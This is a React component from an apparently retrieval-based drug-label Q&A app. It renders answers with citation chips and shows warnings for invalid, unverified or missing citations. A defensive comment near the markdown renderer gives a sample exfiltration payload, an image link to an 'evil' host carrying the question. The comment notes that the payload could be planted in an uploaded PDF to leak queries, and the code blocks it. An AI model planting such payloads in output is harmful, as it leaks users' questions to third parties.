'use client';

import { Children, isValidElement, cloneElement, type ReactNode } from 'react';
import ReactMarkdown from 'react-markdown';
import { CITATION, citedNumbers, parseCitations, PARTIAL_CITATION, splitCitations } from '@/lib/rag/citations';
import { NOT_FOUND } from '@/lib/rag/prompt';
import type { ChatMessage, SourceRef } from '@/lib/types';
import { sourceLabel } from './cite';

type Props = {
  message: ChatMessage;
  /** source number open in the panel, if it belongs to this message */
  selectedN: number | null;
  onCite: (s: SourceRef) => void;
  onExample: () => void;
};

export function Message({ message, selectedN, onCite, onExample }: Props) {
  // while streaming, hide a citation that has started but not closed yet ([2 "reduce the do…)
  const text = message.parts
    .map((p) => (p.type === 'text' ? p.text : ''))
    .join('')
    .replace(PARTIAL_CITATION, '');

  if (message.role === 'user') {
    return (
      // still a heading, so screen-reader users can jump between questions
      <h3 className="max-w-[85%] rounded-2xl rounded-br-md bg-line/70 px-4 py-2.5 text-[15px] leading-snug font-normal whitespace-pre-wrap text-ink sm:max-w-[75%]">
        {text}
      </h3>
    );
  }

  if (text.trim() === NOT_FOUND) {
    return (
      <div className="max-w-[70ch] border-l-2 border-line pl-4">
        <p className="text-[15px] font-medium">Not in the loaded labels.</p>
        <p className="mt-1 text-[13.5px] leading-relaxed text-ink-3">
          No passage answered this, so nothing was generated. The labels cover dosing, interactions, warnings and use in
          specific populations for the drugs on the left.
        </p>
        <button
          type="button"
          onClick={onExample}
          className="mt-1 min-h-11 text-[13.5px] font-medium text-ink-2 underline underline-offset-2 hover:text-ink lg:min-h-0 lg:py-1"
        >
          Try an example question
        </button>
      </div>
    );
  }

  const sources = message.parts.find((p) => p.type === 'data-sources')?.data.items ?? [];
  const check = message.parts.find((p) => p.type === 'data-citations')?.data;
  const invalid = new Set(check?.invalid ?? []);
  const unverified = new Set(check?.unverified ?? []);
  const notes = [
    check?.cutOff && 'The answer was cut off before it finished. Ask a narrower question.',
    check?.uncited && 'This answer cites no label passage. Do not rely on it.',
  ].filter((n): n is string => !!n);
  const quotes = new Map<number, string | null>();
  for (const c of parseCitations(text)) if (!quotes.get(c.n)) quotes.set(c.n, c.quote);
  // what the source panel shows: the source plus the quote the answer took from it
  const byN = new Map<number, SourceRef>(
    sources.map((s) => [
      s.n,
      { ...s, quote: quotes.get(s.n) ?? null, quoteFound: check ? !unverified.has(s.n) : undefined },
    ]),
  );
  const cited = citedNumbers(text)
    .map((n) => byN.get(n))
    .filter((s): s is SourceRef => !!s);

  const chip = (n: number, quote: string | undefined, key: string) => {
    const s = byN.get(n);
    if (!s || invalid.has(n)) {
      return (
        <span
          key={key}
          title="This citation does not match any retrieved source"
          className="mx-0.5 rounded px-1 text-[12px] text-danger line-through decoration-danger/60"
        >
          {n}
        </span>
      );
    }
    return (
      <button
        key={key}
        type="button"
        onClick={() => onCite(s)}
        data-cite={n}
        title={
          unverified.has(n)
            ? `${quote ? `“${quote}” ` : ''}not found in this passage. ${sourceLabel(s)}`
            : [quote && `“${quote}”`, sourceLabel(s)].filter(Boolean).join(' · ')
        }
        aria-label={`Source ${n}: ${sourceLabel(s)}${unverified.has(n) ? ', quote not found in source' : ''}`}
        // the ::before pad gives a ~44 px tap area without changing the look
        className={`relative mx-px inline-flex h-[18px] min-w-[18px] translate-y-[-1px] items-center justify-center rounded px-1 align-middle font-mono text-[11px] font-medium transition-colors before:absolute before:-inset-[13px] before:content-[''] ${
          selectedN === n
            ? 'bg-cite text-white'
            : unverified.has(n)
              ? 'bg-warn-soft text-warn-ink underline decoration-dotted decoration-2 underline-offset-2 hover:bg-warn-ink hover:text-white'
              : 'bg-cite-soft text-cite hover:bg-cite hover:text-white'
        }`}
      >
        {n}
      </button>
    );
  };

  // Replace [n] and [n "quote"] in rendered text nodes with clickable chips; the quote goes in the tooltip.
  const withChips = (children: ReactNode): ReactNode =>
    Children.map(children, (child) => {
      if (typeof child === 'string') {
        return splitCitations(child).map((part, i) =>
          typeof part === 'number' ? chip(part, quotes.get(part) ?? undefined, `${i}`) : part,
        );
      }
      if (isValidElement<{ children?: ReactNode }>(child) && child.props.children) {
        return cloneElement(child, undefined, withChips(child.props.children));
      }
      return child;
    });

  return (
    <div>
      <div className="answer max-w-[70ch] text-[15.5px] leading-[1.65]">
        <ReactMarkdown
          // Answers render text only: an image or link in model output could send the question to another site
          // (a planted "![](https://evil/?q=...)" in an uploaded PDF would load on render).
          disallowedElements={['img']}
          components={{
            a: ({ children }) => <span>{children}</span>,
            p: ({ node, children }) => {
              const only = node?.children.length === 1 ? node.children[0] : undefined;
              const lead = only?.type === 'element' && only.tagName === 'strong';
              return <p className={lead ? 'lead' : undefined}>{withChips(children)}</p>;
            },
            li: ({ children }) => <li>{withChips(children)}</li>,
          }}
        >
          {/* quotes leave the text before markdown runs, so a "*" or "_" inside one cannot break the chip */}
          {text.replace(CITATION, '[$1]')}
        </ReactMarkdown>
      </div>

      {/* mounted with the message, so screen readers announce the warning when it arrives after streaming */}
      <p role="status" className="sr-only">
        {[...notes, unverified.size > 0 && 'Some quoted words were not found in their source. Check the sources marked in the list.']
          .filter(Boolean)
          .join(' ')}
      </p>
      {notes.map((n) => (
        <p
          key={n}
          className="mt-4 max-w-[70ch] rounded-md bg-warn-soft px-3 py-2 text-[13px] leading-snug text-warn-ink"
        >
          {n}
        </p>
      ))}
      {unverified.size > 0 && (
        <p className="mt-4 max-w-[70ch] rounded-md bg-warn-soft px-3 py-2 text-[13px] leading-snug text-warn-ink">
          {unverified.size === 1 ? 'Source' : 'Sources'}{' '}
          {[...unverified].map((n, i) => {
            const s = byN.get(n);
            return (
              <span key={n}>
                {i > 0 && ', '}
                {s ? (
                  <button type="button" onClick={() => onCite(s)} className="font-medium underline underline-offset-2">
                    {n}
                  </button>
                ) : (
                  n
                )}
              </span>
            );
          })}
          : quote not found in that label passage. Check {unverified.size === 1 ? 'it' : 'them'} before relying on this
          answer.
        </p>
      )}

      {cited.length > 0 && (
        <div className="mt-5 max-w-[70ch] border-t border-line pt-3">
          <h4 className="mb-1 text-[11.5px] font-medium tracking-[0.06em] text-ink-3 uppercase">References</h4>
          <ol>
            {cited.map((s) => {
              const active = selectedN === s.n;
              return (
                <li key={s.n}>
                  <button
                    type="button"
                    onClick={() => onCite(s)}
                    data-cite={s.n}
                    className={`group flex min-h-11 w-full items-center gap-2.5 py-1 text-left sm:min-h-0 text-[13.5px] ${
                      active ? 'text-ink' : 'text-ink-2 hover:text-ink'
                    }`}
                  >
                    <span
                      className={`min-w-[22px] rounded px-1 py-px text-center font-mono text-[11px] ${
                        active
                          ? 'bg-cite text-white'
                          : unverified.has(s.n)
                            ? 'bg-warn-soft text-warn-ink underline decoration-dotted underline-offset-2'
                            : 'bg-cite-soft text-cite'
                      }`}
                    >
                      {s.n}
                      {unverified.has(s.n) && <span className="sr-only">, quote not found</span>}
                    </span>
                    <span className="min-w-0 flex-1 truncate group-hover:underline group-hover:underline-offset-2">
                      {sourceLabel(s, false)}
                    </span>
                    <span className="shrink-0 font-mono text-[11px] text-ink-3">p. {s.page}</span>
                  </button>
                </li>
              );
            })}
          </ol>
        </div>
      )}
    </div>
  );
}
